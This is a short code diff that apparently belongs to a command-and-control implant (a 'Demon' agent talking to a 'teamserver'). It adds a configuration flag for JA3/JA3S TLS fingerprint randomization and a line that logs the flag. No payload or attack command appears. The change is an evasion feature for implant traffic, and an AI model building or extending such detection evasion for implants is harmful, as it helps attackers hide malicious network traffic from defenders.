@@ -785,6 +785,11 @@ VOID DemonConfig()
     {
         PUTS( "[CONFIG] [PROXY] Disabled" );
     }
+
+    /* ARC-06: JA3/JA3S fingerprint randomization.
+     * Default to 0 (false) when the teamserver omits the field. */
+    Instance->Config.Transport.Ja3Randomize = (BOOL) ParserGetInt32( &Parser );
+    PRINTF( "[CONFIG] Ja3Randomize: %s\n", Instance->Config.Transport.Ja3Randomize ? "TRUE" : "FALSE" );
 #endif
 
 #ifdef TRANSPORT_SMB
